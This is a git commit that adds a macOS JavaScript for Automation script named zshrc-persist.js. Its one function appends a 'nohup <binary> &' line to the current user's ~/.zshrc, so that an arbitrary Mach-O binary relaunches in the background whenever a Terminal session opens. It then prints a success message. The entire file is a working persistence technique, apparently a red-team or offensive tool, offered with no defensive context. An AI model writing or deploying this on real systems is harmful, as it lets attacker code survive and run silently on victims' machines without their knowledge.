4fad4b767d9f9936f95df145c9c402f31f497e5c
Cedric Owens <41086586+cedowens@users.noreply.github.com>
2022-02-24 10:43:33 -0500

    Add files via upload

---
+++ zshrc-persist.js
@@ -0,0 +1,42 @@
+function Persist(binpath){
+ObjC.import('Cocoa');
+ObjC.import('Foundation');
+ObjC.import('stdlib');
+var currentApp = Application.currentApplication();
+currentApp.includeStandardAdditions = true;
+var fileMan = $.NSFileManager.defaultManager;
+var results = "";
+var username = currentApp.systemInfo().shortUserName;
+var zpath = "/Users/" + username + "/.zshrc";
+
+if (fileMan.fileExistsAtPath(binpath)){
+     try{
+     var contents = "\nnohup " + binpath + " &";
+     var handle = currentApp.openForAccess(Path(zpath), {
+     writePermission: true
+     })
+
+     currentApp.write(contents, {
+     to: zpath,
+     startingAt: currentApp.getEof(zpath)
+     })
+     currentApp.closeAccess(zpath);
+
+     results += "[+] DONE! Added an entry at the bottom of " + zpath + " to run " + binpath + " when a new Terminal session is started";
+     }
+     catch(error){
+	results += error
+	results += "\n";
+     }
+
+        }
+else{
+      results += "[-] File " + binpath + " not found\n";
+     }
+
+
+return results
+
+}
+
+//Persist('path_to_macho_binary')
